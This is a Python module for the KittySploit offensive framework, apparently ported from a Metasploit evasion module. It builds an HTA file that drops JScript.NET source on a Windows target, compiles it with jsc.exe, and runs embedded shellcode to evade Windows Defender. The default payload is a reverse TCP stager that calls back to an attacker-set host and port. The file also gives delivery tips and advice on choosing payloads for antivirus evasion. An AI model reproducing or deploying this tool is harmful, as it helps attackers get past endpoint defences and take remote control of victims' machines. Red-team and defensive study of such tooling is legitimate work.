#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Microsoft Windows Defender evasive JS.Net and HTA.

Generates an HTA that writes a JScript.NET source file to %TEMP%, compiles it
with the system jsc.exe, and executes the resulting EXE containing embedded
shellcode (VirtualAlloc + CreateThread).
"""

import random
import string

from kittysploit import *
from lib.compile.backdoor_helpers import generate_payload_bytes, option_value, report_payload_size
from lib.compile.defender_js_hta import build_defender_js_hta


class Module(Backdoor):
    __info__ = {
        "name": "Windows Defender Evasive JS.Net and HTA",
        "description": (
            "Generate an HTA that writes and compiles a JScript.NET file containing "
            "shellcode on the target machine. The compiled EXE executes the payload "
            "via dynamic P/Invoke (VirtualAlloc/CreateThread). RC4 or HTTPS payloads "
            "are recommended for best results against Defender."
        ),
        "author": ["sinmygit", "Shelby Pace", "KittySploit"],
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://github.com/rapid7/metasploit-framework/blob/master/modules/evasion/windows/windows_defender_js_hta.rb",
            "https://lolbas-project.github.io/lolbas/Binaries/Jsc/",
        ],
        "tags": ["windows", "defender", "hta", "jscript", "jsc", "evasion", "lolbin"],
    }

    payload_path = OptString(
        "payloads/stagers/windows/x86/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    arch = OptChoice(
        "auto",
        "jsc.exe /platform target",
        False,
        ["auto", "x86", "x64", "anycpu"],
    )
    output_name = OptString("", "Output HTA filename (random .hta if empty)", False)

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def _random_hta_name(self) -> str:
        length = random.randint(3, 10)
        return "".join(random.choice(string.ascii_letters) for _ in range(length)) + ".hta"

    def run(self):
        shellcode = generate_payload_bytes(self)
        if not shellcode:
            return False
        report_payload_size(shellcode)

        arch_opt = str(option_value(self, "arch") or "auto").lower()
        selected_arch = None if arch_opt == "auto" else arch_opt

        hta_content = build_defender_js_hta(
            self,
            shellcode=shellcode,
            arch=selected_arch,
        )
        if not hta_content:
            return False

        filename = str(option_value(self, "output_name") or "").strip()
        if not filename:
            filename = self._random_hta_name()
        if not filename.lower().endswith(".hta"):
            filename += ".hta"

        self.write_out_dir(filename, hta_content)
        print_success(f"Generated: {filename}")
        print_info(
            "Delivery: mshta.exe or double-click the HTA on the target. "
            "Requires .NET Framework with jsc.exe (LOLBin)."
        )
        print_info(
            f"Payload: {option_value(self, 'payload_path')} | "
            f"Arch: {selected_arch or 'auto'} | "
            f"LHOST: {option_value(self, 'lhost')}:{option_value(self, 'lport')}"
        )
        print_warning("Use only on authorized systems. Start a matching listener before delivery.")
        return True
